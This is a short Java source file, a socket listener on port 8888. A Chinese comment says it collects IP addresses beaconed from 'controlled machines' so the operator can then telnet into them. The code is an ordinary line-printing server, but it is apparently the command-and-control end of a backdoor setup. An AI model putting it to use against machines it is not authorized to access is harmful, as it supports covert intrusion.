package com.demo.hostlistener;

import java.net.ServerSocket;
import java.util.Scanner;

/**
 * 运行在自己的主机上，通过监听8888端口接收来自受控机的IP信息，
 * 通过IP地址可以使用telnet客户端建立一个连接
 *  
 * 默认监听端口 8888
 */
public class Listener{
    private static final int PORT = 8888;

    public static void main(String[] args) {
        try(var listenerSocket = new ServerSocket(PORT)){
            while(true){
                var socket = listenerSocket.accept();
                var reader = new Scanner(socket.getInputStream());
                while(reader.hasNextLine())
                    System.out.println(reader.nextLine());
            }
        }catch(Exception ignored){;}
    }
}